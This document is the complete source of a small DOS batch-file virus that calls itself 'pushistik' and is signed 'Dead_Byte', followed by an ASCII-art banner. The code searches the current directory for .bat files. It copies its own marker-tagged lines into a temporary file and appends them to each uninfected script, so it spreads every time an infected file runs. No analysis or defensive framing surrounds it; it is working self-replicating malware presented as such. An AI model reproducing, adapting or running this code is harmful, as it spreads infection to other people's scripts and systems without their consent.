cls rem "PUSHISTIK"
if "%1"=="PUSHISTIK" goto inf&gt;nul
for %%f in (*.bat) do call %0 PUSHISTIK %%f&gt;nul
goto end rem "PUSHISTIK"
:inf rem "PUSHISTIK"
find "PUSHIST" %0&gt;PUSHIST.vir
find /v "PUSHIST" %2
if not errorlevel 1 goto end rem "PUSHISTIK"
copy %2+PUSHIST.vir /b &gt;nul
:end rem "PUSHISTIK"
del PUSHIST.vir
REM Dead_Byte                                            "PUSHISTIK"
REM                                                      "PUSHISTIK"
REM  ±±±±  ±   ±  ±±   ±  ±  ±   ±±  ±±±±± ±  ±  ±±       "PUSHISTIK"
REM  ±   ± ±   ± ±  ±  ±  ±     ±  ±   ±      ±  ±        "PUSHISTIK"
REM  ±   ± ±   ±  ±    ±  ±  ±   ±     ±   ±  ±±±         "PUSHISTIK"
REM  ±±±±  ±   ±   ±   ±±±±  ±    ±    ±   ±  ± ±         "PUSHISTIK"
REM  ±     ±   ± ±  ±  ±  ±  ±  ±  ±   ±   ±  ±  ±        "PUSHISTIK"
REM  ±      ±±±   ±±   ±  ±  ±   ±±    ±   ±  ±   ±       "PUSHISTIK"
REM                                                      "PUSHISTIK"
REM  	bat-virus 'pushistik'                            "PUSHISTIK"